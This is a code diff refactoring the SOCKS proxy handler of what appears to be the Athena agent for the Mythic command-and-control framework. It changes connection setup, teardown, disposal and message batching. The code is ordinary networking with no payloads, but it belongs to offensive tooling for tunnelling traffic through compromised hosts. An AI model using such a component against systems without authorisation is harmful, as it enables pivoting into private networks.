@@ -1,14 +1,13 @@
 ﻿using Athena.Models.Athena.Commands;
 using Athena.Models.Athena.Socks;
 using Athena.Models.Mythic.Response;
+using Athena.Models.Socks;
 using Athena.Utilities;
 using System.Collections.Concurrent;
 using System.Diagnostics;
 
 namespace Athena.Commands
 {
-    //Try using this library for next rewrite
-    //https://github.com/godsharp/GodSharp.Socket/blob/master/samples/GodSharp.Socket.TcpClientSample/Program.cs
     public class SocksHandler
     {
         private CancellationTokenSource ct { get; set; }
@@ -19,37 +18,6 @@ namespace Athena.Commands
         {
             this.running = false;
             this.connections = new ConcurrentDictionary<int, AthenaSocksConnection>();
-        }
-
-        /// <summary>
-        /// Start the SOCKS Listener
-        /// </summary>
-        public async Task<bool> Start()
-        {
-            this.ct = new CancellationTokenSource();
-            this.connections = new ConcurrentDictionary<int, AthenaSocksConnection>();
-
-            return true;
-        }
-
-        /// <summary>
-        /// Stops the SOCKS Listener
-        /// </summary>
-        public async Task<bool> Stop()
-        {
-            if (!this.running)
-            {
-                return true;
-            }
-
-            this.running = false;
-
-            if (this.ct is not null)
-            {
-                this.ct.Cancel();
-            }
-
-            return true;
         }
 
         /// <summary>
@@ -82,7 +50,6 @@ namespace Athena.Commands
             {
                 if (this.connections[sm.server_id].client.IsConnected) //Check if our connection is alive
                 {
-                    Debug.WriteLine($"[{DateTime.Now}] Sending {Misc.Base64DecodeToByteArray(sm.data).Length} bytes to session: {sm.server_id}");
                     this.connections[sm.server_id].client.Send(Misc.Base64DecodeToByteArray(sm.data)); //The connection is open still, let's send the packet
                 }
             }
@@ -91,14 +58,14 @@ namespace Athena.Commands
             {
                 if (this.connections[sm.server_id].client.IsConnected) //Are we still connected and need to initiate a disconnect?
                 {
-                    Debug.WriteLine($"[{DateTime.Now}] Disconnecting session: {sm.server_id}");
-                    this.connections[sm.server_id].client.DisconnectAsync(); //We are, so let's issue the disconnect
+                    this.connections[sm.server_id].client.Disconnect(); //We are, so let's issue the disconnect
                 }
-
-                Debug.WriteLine($"[{DateTime.Now}] Removing session: {sm.server_id}");
-                this.connections.TryRemove(sm.server_id, out _); //Finally, remove the session from our tracker
+                AthenaSocksConnection ac;
+                if (this.connections.TryRemove(sm.server_id, out ac))//Finally, remove the session from our tracker and dispose of the client
+                {
+                    ac.client.Dispose();
+                }
             }
-
         }
 
         /// <summary>
@@ -125,35 +92,10 @@ namespace Athena.Commands
                 AthenaSocksConnection sc = new AthenaSocksConnection(co); //Create Socks Connection Object, and try to connect
                 await AddConnection(sc); //Add our connection to the Dictionary;
                 
-                sc.client.Connect(); //Connect to the endpoint
-
-                sc.onSocksEvent.WaitOne(); //Wait for something to happen.
-
-                SocksMessage smOut;
-                if (sc.client.IsConnected)
-                {
-                    smOut = new SocksMessage(
-                        sc.server_id,
-                        new ConnectResponse
-                        {
-                            bndaddr = new byte[] { 0x01, 0x00, 0x00, 0x7F },
-                            bndport = new byte[] { 0x00, 0x00 },
-                            addrtype = co.addressType,
-                            status = ConnectResponseStatus.Success,
-                        }.ToByte(),
-                        false
-                        );
-                    await SocksResponseHandler.AddSocksMessageAsync(smOut);
-                }
-                else
-                {
-                    ReturnMessageFailure(sc.server_id);
-                }
+                sc.client.RunAsync(); //Connect to the endpoint
             } 
-            catch (Exception e)
+            catch
             {
-                Debug.WriteLine("Message ID " + sm.server_id + Environment.NewLine + e.ToString());
-                Debug.WriteLine(sm.data);
                 ReturnMessageFailure(sm.server_id);
             }
         }
@@ -166,6 +108,7 @@ namespace Athena.Commands
                     new ConnectResponse{
                             bndaddr = new byte[] { 0x01, 0x00, 0x00, 0x7F },
                             bndport = new byte[] { 0x00, 0x00 },
+                            addrtype = (byte)AddressType.IPv4,
                             status = ConnectResponseStatus.GeneralFailure,
                     }.ToByte(),
                     true
@@ -179,21 +122,17 @@ namespace Athena.Commands
                 return;
             }
 
-            List<SocksMessage> messages = new List<SocksMessage>();
-
             foreach (var conn in this.connections)
             {
-                SocksMessage sm = conn.Value.GetMessage();
-                if (sm is not null)
+                List<SocksMessage> returnMessages = conn.Value.GetMessages();
+                Console.WriteLine($"[{DateTime.Now}] Adding: {returnMessages.Count()}");
+                foreach (var msg in returnMessages)
                 {
-                    messages.Add(sm);
-
-                    if (sm.exit)
+                    SocksResponseHandler.AddSocksMessageAsync(msg);
+                    if (msg.exit)
                     {
-                        this.connections.TryRemove(sm.server_id, out _);
+                        this.connections.TryRemove(msg.server_id, out _);
                     }
-
-                    SocksResponseHandler.AddSocksMessageAsync(sm);
                 }
             }
         }
